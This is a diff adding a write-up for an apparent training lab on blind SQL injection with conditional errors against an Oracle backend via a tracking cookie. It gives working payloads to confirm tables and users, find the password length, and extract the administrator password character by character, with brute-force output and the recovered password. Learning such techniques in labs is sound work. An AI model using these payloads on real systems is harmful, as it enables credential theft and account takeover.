@@ -1,0 +1,80 @@
+Lab #12 Blind SQL injection with conditional errors
+
+Vulnerable parameter - tracking cookie
+End Goals:
+- Output the administrator password
+- Login as the administrator user
+-------------------------------------------------------------
+
+Steps:
+
+1. Prove that the parameter is Vulnerable.
+
+' || (select '' from dual) || '     => Oracle database.
+
+' || (select '' from dualvasdvsadg) || '    => error
+
+2. Confirm that the users table exists in the database.
+
+' || (select '' from users where rownum=1) || '
+    => Users table exists.
+
+3. Confirm that the administrator user exists in the users table.
+
+' || (select '' from users where username = 'administrator') || '   
+    => this won't work because if the administrator exists then it will run the query and give 200OK but if it does'nt exists then it wont perfrom the query(this is how the Oracle database works.)
+
+' || (select CASE when (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM DUAL) || '
+    => when this condition 1=1 becomes true then the TO_CHAR statements is executed which will give us error as in it 1 in being divided by 0.
+    and if the condition becomes false then the ELSE statement in executed which gives nothing therefore it'll give no error => 200OK.
+
+' || (select CASE when (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator') || '
+    =>This query will work to determine if the administrator user exists in the users table or not.
+    => in the Oracle database the from clause is executed first so it evaluates that the username administrator exists then it will run the CASE query and hence it will Output an error.
+    but if the user administrator does not exists it will not execute the CASE query and hence there will be not error
+    therefore, If error => administrator exists
+               no error => administrator does not exists 
+
+    => HTTP/2 500 Internal Server Error => administrator exists.
+
+' || (select CASE when (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='asogihasn9ah') || '
+=> 200OK => user does not exists.
+
+4. Determine the length of the password.
+
+' || (select CASE when (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and LENGTH(password)>1) || '
+    => now bruteforce this 1 using intruder at password>1
+    => we got the password LENGTH which is '20'.
+
+5. Output the whole password and login as administrator.
+
+' || (select CASE when (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and substr(password,1,1)='a') || '
+    => this query asks the server if the 1st character of the password is a or not 
+    if it gives error then its 'a' otherwise its not.
+
+=> we'll do the same thing which we have done in the previous lab.
+
+
+641	1	6	500	192	false	false	2555	
+482	2	y	500	205	false	false	2555	
+383	3	t	500	210	false	false	2555	
+544	4	1	500	178	false	false	2555	
+325	5	q	500	197	false	false	2555	
+406	6	u	500	166	false	false	2555	
+487	7	y	500	166	false	false	2555	
+48	8	c	500	329	false	false	2555	
+189	9	j	500	196	false	false	2555	
+270	10	n	500	228	false	false	2555	
+71	11	d	500	183	false	false	2555	
+472	12	x	500	159	false	false	2555	
+573	13	2	500	213	false	false	2555	
+14	14	a	500	216	false	false	2555	
+195	15	j	500	171	false	false	2555	
+556	16	1	500	175	false	false	2555	
+617	17	4	500	164	false	false	2555	
+378	18	s	500	218	false	false	2555	
+179	19	i	500	176	false	false	2555	
+680	20	7	500	199	false	false	2555	
+
+
+SO the final password is => 6yt1quycjndx2aj14si7
